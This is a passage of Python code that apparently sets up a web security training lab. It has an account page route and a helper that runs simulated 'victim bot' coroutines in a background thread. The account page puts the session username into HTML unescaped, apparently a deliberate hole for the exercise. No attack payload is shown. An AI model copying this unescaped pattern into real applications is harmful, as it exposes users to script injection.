        user = (sess or {}).get("user")
        if not user:
            return RedirectResponse("/login", status_code=302)
        return HTMLResponse(
            lab_page(state.title, f"<h1>My account: {user}</h1>", state.solved)
        )

    return lab, state, password


# ---------------------------------------------------------------------------
# Shared bot plumbing
# ---------------------------------------------------------------------------


def start_background_bots(bot_factories, *bases) -> threading.Thread:
    """Run the victim bot(s) on a private event loop in a daemon thread."""

    def runner():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = [loop.create_task(bot(*bases)) for bot in bot_factories]
        loop.run_until_complete(asyncio.gather(*tasks))

    t = threading.Thread(target=runner, daemon=True)
    t.start()
    return t
